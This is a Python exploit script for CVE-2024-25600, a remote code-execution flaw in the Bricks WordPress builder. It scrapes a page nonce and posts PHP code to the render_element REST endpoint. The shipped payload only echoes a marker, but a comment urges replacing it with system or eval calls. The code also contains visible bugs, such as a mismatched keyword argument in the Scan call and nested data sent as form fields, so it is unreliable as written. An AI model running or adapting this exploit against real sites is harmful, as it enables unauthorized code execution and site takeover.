# /usr/bin/python3
# Usage: python3 CVE-2024-25600.py

import requests
from bs4 import BeautifulSoup
import re
import urllib3
urllib3.disable_warnings()


headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Mobile Safari/537.36"
}

parts = ["/wp-json/bricks/v1/render_element", "/?rest_route=/bricks/v1/render_element"]

def get_nonce(target):
    try:
        response = requests.get(target, verify=False, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        script_tag = soup.find("script", id="bricks-scripts-js-extra")
        if script_tag:
            match = re.search(r'"nonce":"([a-f0-9]+)"', script_tag.string)
            if match:
                nonce = match.group(1)
                return nonce
    except Exception as e:
        print(e)
        return None

def verify(url, proxies={}):
    nonce = get_nonce(url)
    element = {
        "postId": "1",
        "nonce": nonce,
        "element": {
            "name": "code",
            "settings": {
                "executeCode": "true",
                "code": "<?php echo 'KHABuhwxnUHDDW' ;?>"
                # You can change payload here, and you can use some more aggressive functions like system or eval :-)
            }
        }
    }

    try:
        for part in parts:
            vul_url = url + part
            response = requests.post(vul_url , headers=headers, proxies=proxies, data=element)
            response.raise_for_status()

            if response.status_code == 200 and 'KHABuhwxnUHDDW' in response.text:
                print(f"{vul_url}:This site is vulnerable.")
                return True
            else:
                continue

    except Exception as e:
        print(e)
        return None

def Scan(url,proxy):
    try:
        return verify(url, proxy)
    except Exception as e:
        print(e)
        return None

if __name__ == '__main__':
    url = 'http://127.0.0.1' # change your url here!
    # proxies = {'http':'http://127.0.0.1:8080'}
    proxies = {}
    Scan(url=url, proxies=proxies)